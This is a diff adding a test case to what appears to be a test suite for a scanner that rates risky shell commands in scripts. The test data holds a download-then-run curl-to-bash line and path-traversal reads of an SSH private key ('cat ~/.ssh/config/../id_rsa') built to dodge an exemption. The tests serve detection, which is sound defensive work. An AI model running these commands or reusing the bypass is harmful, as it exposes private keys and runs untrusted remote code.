@@ -1283,3 +1283,12 @@ open(d + '/c.sh', 'w').write('curl -o x ' * 100000 + '\n')" "$T/repos/r/x"
   expect_row high upstream download-then-run run.sh 'curl -fsSL https://e.example/x > /tmp/y; bash /tmp/y'
   expect_row none upstream download-then-run run.sh 'curl -o out.tgz https://e.example/x.tgz'
 }
+
+@test "credential-read: only exactly ~/.ssh/config or known_hosts is exempt, not a path that continues past them" {
+  expect_row high upstream credential-read run.sh 'cat ~/.ssh/config/../id_rsa'
+  expect_row high upstream credential-read run.sh 'cat ~/.ssh/config.d/../id_rsa'
+  expect_row high upstream credential-read run.sh 'cat ~/.ssh/known_hosts/../id_rsa'
+  expect_row none upstream credential-read run.sh 'cat ~/.ssh/config'
+  expect_row none upstream credential-read run.sh 'cat "$HOME/.ssh/known_hosts"'
+  expect_row none upstream credential-read run.sh 'ls ~/.ssh/config; echo done'
+}
